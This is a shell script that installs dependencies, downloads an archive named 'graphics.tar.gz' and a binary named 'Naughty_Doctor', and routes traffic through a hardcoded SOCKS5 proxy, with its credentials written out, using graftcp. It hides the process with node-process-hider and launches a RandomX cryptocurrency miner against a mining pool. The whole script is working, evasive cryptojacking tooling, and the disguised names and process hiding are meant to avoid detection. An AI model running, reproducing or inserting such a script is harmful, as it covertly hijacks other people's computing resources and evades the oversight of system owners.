#!/bin/sh
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor
chmod +x Naughty_Doctor

#unset LD_PRELOAD
#unset LD_PRELOAD_ENV
#unset LD_LIBRARY_PATH

ph add Naughty_Doctor

./Naughty_Doctor --disable-gpu --algorithm randomx --pool stratum+tcp://prohashing.com:3359 --password a=randomx --wallet Prodent.TEST-$(echo $(shuf -i 1-9999 -n 1)) --proxy 2BHVpyGPD:1rN14HAmV@176.53.133.217:57597
